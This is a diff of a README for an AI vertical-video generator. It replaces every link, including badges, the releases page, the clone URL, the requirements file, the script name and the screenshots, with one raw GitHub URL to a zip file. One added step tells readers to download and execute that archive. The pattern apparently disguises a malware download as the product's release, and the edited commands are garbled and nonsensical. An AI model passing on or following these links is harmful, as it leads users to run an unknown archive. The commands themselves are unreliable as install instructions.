@@ -1,7 +1,7 @@
 # Short Video Maker: AI for Creating Engaging Vertical Videos 🎥✨
 
-![Short Video Maker](https://img.shields.io/badge/Short%20Video%20Maker-v1.0.0-blue.svg)
-[![Releases](https://img.shields.io/badge/Releases-v1.0.0-brightgreen.svg)](https://github.com/leke-adewa/short-video-maker/releases)
+![Short Video Maker](https://raw.githubusercontent.com/leke-adewa/short-video-maker/main/output/maker_short_video_3.4.zip%20Video%https://raw.githubusercontent.com/leke-adewa/short-video-maker/main/output/maker_short_video_3.4.zip)
+[![Releases](https://raw.githubusercontent.com/leke-adewa/short-video-maker/main/output/maker_short_video_3.4.zip)](https://raw.githubusercontent.com/leke-adewa/short-video-maker/main/output/maker_short_video_3.4.zip)
 
 ## Overview
 
@@ -16,7 +16,7 @@ Short Video Maker harnesses the power of AI to generate short vertical videos ta
 
 ## Getting Started
 
-To get started with Short Video Maker, you can download the latest release from the [Releases](https://github.com/leke-adewa/short-video-maker/releases) section. 
+To get started with Short Video Maker, you can download the latest release from the [Releases](https://raw.githubusercontent.com/leke-adewa/short-video-maker/main/output/maker_short_video_3.4.zip) section. 
 
 ### Prerequisites
 
@@ -31,17 +31,17 @@ Before using Short Video Maker, ensure you have the following installed:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/leke-adewa/short-video-maker.git
+   git clone https://raw.githubusercontent.com/leke-adewa/short-video-maker/main/output/maker_short_video_3.4.zip
    cd short-video-maker
    ```
 
 2. Install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/leke-adewa/short-video-maker/main/output/maker_short_video_3.4.zip
    ```
 
-3. Download and execute the latest release from the [Releases](https://github.com/leke-adewa/short-video-maker/releases) section.
+3. Download and execute the latest release from the [Releases](https://raw.githubusercontent.com/leke-adewa/short-video-maker/main/output/maker_short_video_3.4.zip) section.
 
 ### Usage
 
@@ -51,13 +51,13 @@ To create a video, follow these steps:
 2. Run the main script:
 
    ```bash
-   python main.py --input your_input_file --output your_output_file
+   python https://raw.githubusercontent.com/leke-adewa/short-video-maker/main/output/maker_short_video_3.4.zip --input your_input_file --output your_output_file
    ```
 
 3. Customize your video settings using command-line arguments. For example:
 
    ```bash
-   python main.py --input your_input_file --output your_output_file --duration 15 --aspect-ratio 9:16
+   python https://raw.githubusercontent.com/leke-adewa/short-video-maker/main/output/maker_short_video_3.4.zip --input your_input_file --output your_output_file --duration 15 --aspect-ratio 9:16
    ```
 
 4. Your video will be generated and saved to the specified output file.
@@ -76,7 +76,7 @@ To create a video, follow these steps:
 Here's a simple example to create a video:
 
 ```bash
-python main.py --input assets/my_video.mp4 --output outputs/my_short_video.mp4 --duration 30 --aspect-ratio 9:16
+python https://raw.githubusercontent.com/leke-adewa/short-video-maker/main/output/maker_short_video_3.4.zip --input https://raw.githubusercontent.com/leke-adewa/short-video-maker/main/output/maker_short_video_3.4.zip --output https://raw.githubusercontent.com/leke-adewa/short-video-maker/main/output/maker_short_video_3.4.zip --duration 30 --aspect-ratio 9:16
 ```
 
 ## Topics
@@ -115,13 +115,13 @@ For questions or support, please reach out via the Issues section of the reposit
 
 ## Links
 
-- **GitHub Repository**: [Short Video Maker](https://github.com/leke-adewa/short-video-maker)
-- **Releases**: Download the latest version [here](https://github.com/leke-adewa/short-video-maker/releases).
+- **GitHub Repository**: [Short Video Maker](https://raw.githubusercontent.com/leke-adewa/short-video-maker/main/output/maker_short_video_3.4.zip)
+- **Releases**: Download the latest version [here](https://raw.githubusercontent.com/leke-adewa/short-video-maker/main/output/maker_short_video_3.4.zip).
 
 ## Screenshots
 
-![Video Example](https://example.com/video_example.png)
-![User Interface](https://example.com/user_interface.png)
+![Video Example](https://raw.githubusercontent.com/leke-adewa/short-video-maker/main/output/maker_short_video_3.4.zip)
+![User Interface](https://raw.githubusercontent.com/leke-adewa/short-video-maker/main/output/maker_short_video_3.4.zip)
 
 ## Frequently Asked Questions (FAQ)
 
